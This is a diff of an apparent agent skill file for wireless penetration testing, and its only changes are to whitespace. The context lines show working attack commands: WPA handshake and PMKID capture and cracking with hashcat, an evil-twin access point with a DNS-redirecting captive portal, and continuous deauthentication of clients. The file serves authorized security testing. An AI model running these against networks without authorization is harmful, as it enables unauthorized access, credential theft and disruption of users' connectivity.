@@ -1,8 +1,8 @@
 ---
 name: performing-wireless-network-penetration-test
 description: Execute a wireless network penetration test to assess WiFi security by
-  capturing handshakes, cracking WPA2/WPA3 keys, detecting rogue access points, and
-  testing wireless segmentation using Aircrack-ng and related tools.
+ capturing handshakes, cracking WPA2/WPA3 keys, detecting rogue access points, and
+ testing wireless segmentation using Aircrack-ng and related tools.
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -130,11 +130,11 @@ hcxpcapngtool -o hash.hc22000 corpguest-01.cap
 
 # Hashcat mode 22000 (WPA-PBKDF2-PMKID+EAPOL)
 hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule
+ -r /usr/share/hashcat/rules/best64.rule
 
 # PMKID attack (no client needed)
 hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_dump.pcapng \
-  --filterlist_ap=AA:BB:CC:DD:EE:02 --filtermode=2
+ --filterlist_ap=AA:BB:CC:DD:EE:02 --filtermode=2
 hcxpcapngtool -o pmkid_hash.hc22000 pmkid_dump.pcapng
 hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
 ```
@@ -163,7 +163,7 @@ EOF
 
 # EAP user file
 cat > hostapd.eap_user << 'EOF'
-*   PEAP,TTLS,TLS,FAST
+* PEAP,TTLS,TLS,FAST
 "t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "t" [2]
 EOF
 
@@ -198,7 +198,7 @@ EOF
 # Start captive portal
 hostapd evil_twin.conf &
 dnsmasq --no-daemon --interface=wlan1 --dhcp-range=192.168.1.10,192.168.1.100,12h \
-  --address=/#/192.168.1.1
+ --address=/#/192.168.1.1
 
 # Deauth clients from real AP to force connection to evil twin
 aireplay-ng -0 0 -a AA:BB:CC:DD:EE:02 wlan0mon
